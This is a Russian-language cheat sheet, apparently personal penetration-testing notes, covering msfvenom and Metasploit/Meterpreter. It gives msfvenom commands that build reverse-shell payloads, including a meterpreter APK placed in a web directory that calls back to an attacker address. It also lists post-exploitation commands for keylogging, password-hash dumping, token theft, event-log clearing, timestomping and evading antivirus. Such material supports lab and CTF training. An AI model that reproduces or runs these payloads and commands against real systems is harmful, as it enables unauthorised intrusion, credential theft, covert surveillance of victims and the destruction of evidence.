# msfvenom
Чтобы узнать, какие полезные нагрузки мы можем собрать, используем следующую команду:
`msfvenom -l payloads`
Затем нам как и в эксплойте нужно указать следующее:
```jsx
LHOST — IP-адрес вашего компьютера (атакующего).
LPORT — порт вашего компьютера, который назначен серверу или программе.
P — сокращение от «payload», полезная нагрузка для выбранной платформы.
F — параметр, который задает тип файла, например, exe для Windows.
```
Пример №1 создания exploit-файла:
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.76 LPORT=4444 R> /var/www/html/trythis.apk
```
Пример №2 создания exploit-файла:
```
msfvenom -p {payload} LHOST=192.162.1.1 LPORT=4444 -f elf > resFile
```
где `elf` - тип исполняемого бинарного файла для Linux.  
также:
`-ax64` - указание 64 битной архитектуры для пэйлоада.
`-f dll` - исполняемый файл для windows
# Metasploit

`use exploit/multi/handler` - напоминает netcat, но нуждается в выставлении пэйлоада из файла msfvenom, например `set payload linux/x64/meterpriter_reverse_tcp`

`use post/multi/manage/shell_to_meterpreter` - модуль для пост-эксплуатации. Позволяет использовать на уязвимой машине `meterpreter`. То есть должно было быть установлено соединение, и и убрано в фон (`^Z`)

`sessions -i {num}` - сменить сессию.

`check` - когда выбран и заполнен exploit, иногда можно проверить уязвима ли система к нему.
`set AutoCheck false` - отключить AutoCheck для эксплойтов.

## Meterpriter
### Основные команды meterpriter 
```
? — меню помощи
background — переносит текущий сеанс в фоновый режим.
bgkill — убивает фоновый скрипт meterpreter.
bglist — отображает список всех запущенных фоновых скриптов.
bgrun — запускает скрипт как фоновый поток.
channel  — отображает активные каналы.
close — закрывает канал.
exit — завершает сеанс работы с meterpreter.
help — меню справки.
interact — взаимодействует с каналом.
irb — перейти в режим сценария Ruby.
migrate — перемещает активный процесс на указанный PID.
quit — завершает сеанс meterpreter.
read — читает данные из канала.
run — выполняет созданный после него скрипт meterpreter.
use — загружает расширение meterpreter.
write — записывает данные в канал.
```
### Команды файловой системы
```
cat — чтение и вывод содержимого файла.
cd — перейти в папку.
del — удалить файл.
download — скачать файл из системы на свою машину.
edit — редактировать файл с помощью vim.
getlwd — показать локальный каталог.
getwd — показать рабочий каталог.
lcd — сменить локальный каталог.
lpwd — отобразить путь локальной директории.
ls — список файлов в текущем каталоге.
mkdir — создать каталог.
pwd — отобразить путь от корневого каталога к текущему рабочему каталогу.
rm — удалить файл.
rmdir — удалить каталог у жертвы.
upload — загрузить файл из своей системы на целевую машину.
```
### Сетевые команды meterpriter
``` 
ipconfig — отображает сетевые интерфейсы с ключевой информацией, включая IP-адрес и т. д.
portfwd — перенаправляет порт целевой системы удаленной службе.
route — просмотр или изменение таблицы маршрутизации жертвы.
```
### Системные команды meterpriter
```
clearav — очищает журналы событий на компьютере жертвы.
execute — выполняет команду.
getpid — получает идентификатор текущего процесса (PID).
getprivs — получает максимально возможные привилегий.
getuid — получить пользователя, от имени которого запущен сервер.
kill — завершить процесс, обозначенный PID.
ps — список запущенных процессов.
reboot — перезагружает компьютер жертвы.
reg — взаимодействовать с реестром жертвы.
rev2self — вызывает RevertToSelf () на машине жертвы.
shell — открывает командную оболочку на машине жертвы.
shutdown — выключает компьютер жертвы.
steal_token — пытается украсть токен указанного (PID) процесса.
sysinfo — получает подробную информацию о компьютере жертвы, такую как ОС и название компьютера.
```
`ps | grep cmd` - узнать параметры процессы cmd
`migrate {PID}` - мигрировать подключение под процесс
### Команды пользовательского интерфейса
``` 
enumdesktops — список всех доступных рабочих столов.
getdesktop — получить текущий рабочий стол meterpreter.
idletime — проверяет, сколько времени система жертвы простаивала.
keyscan_dump — выгружает содержимое программного обеспечения кейлоггера.
keyscan_start — запускает программный кейлоггер, когда он связан с процессом, таким как Word или браузер.
keyscan_stop — останавливает программный кейлоггер.
screenshot — делает снимок экрана рабочего стола meterpreter.
set_desktop — изменяет рабочий стол meterpreter.
uictl — позволяет управлять некоторыми компонентами пользовательского интерфейса.
```
### Команды повышения привилегий
``` 
getsystem — использует 15 встроенных методов для получения привилегий системного администратора.
getprivs — получает максимально возможные привилегий.
```
### Команды дампа пароля
``` 
hashdump — захватывает хеши из файла пароля (SAM).
```
Обратите внимание, что hashdump часто отключает программное обеспечение AV, но теперь есть два более скрытых сценария: «запустить hashdump» и «запустить smart_hashdump».
### Команды Timestomp
`timestomp` — управляет изменением, доступом и созданием атрибутов файла.